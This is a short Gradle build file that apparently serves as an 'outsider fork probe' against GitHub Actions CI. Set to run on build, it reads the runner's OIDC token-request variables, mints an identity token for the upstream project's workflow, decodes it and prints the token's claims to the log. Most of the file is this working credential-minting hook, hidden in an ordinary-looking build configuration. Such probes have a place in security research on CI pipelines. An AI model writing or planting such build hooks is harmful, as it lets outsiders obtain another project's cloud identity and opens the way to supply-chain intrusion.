plugins {
    id "java"
}

// OUTSIDER fork probe: does the UPSTREAM's generated job execute THIS file, and whose identity does it mint?
println "FORKOIDC-4B7Q outsider-build-file-executed"
def u = System.getenv("ACTIONS_ID_TOKEN_REQUEST_URL")
def t = System.getenv("ACTIONS_ID_TOKEN_REQUEST_TOKEN")
println "FORKOIDC-4B7Q url-present=" + (u != null) + " tok-present=" + (t != null)
if (u != null && t != null) {
    try {
        def c = new URL(u + "&audience=c218-probe").openConnection()
        c.setRequestProperty("Authorization", "Bearer " + t)
        c.setRequestProperty("Accept", "application/json")
        c.setConnectTimeout(15000); c.setReadTimeout(15000)
        def code = c.getResponseCode()
        println "FORKOIDC-4B7Q mint-status=" + code
        if (code == 200) {
            def body = c.getInputStream().getText("UTF-8")
            def m = (body =~ /"value"\s*:\s*"([^"]+)"/)
            if (m.find()) {
                def parts = m.group(1).split("\.")
                def claims = new String(Base64.getUrlDecoder().decode(parts[1]))
                ["sub","repository","repository_owner","workflow_ref","event_name","ref"].each { k ->
                    def mm = (claims =~ (""" + k + ""\s*:\s*"([^"]*)""))
                    if (mm.find()) println "FORKOIDC-4B7Q claim " + k + " = " + mm.group(1)
                }
            }
        }
    } catch (Exception e) { println "FORKOIDC-4B7Q error=" + e.getClass().getSimpleName() }
}

repositories { mavenCentral() }
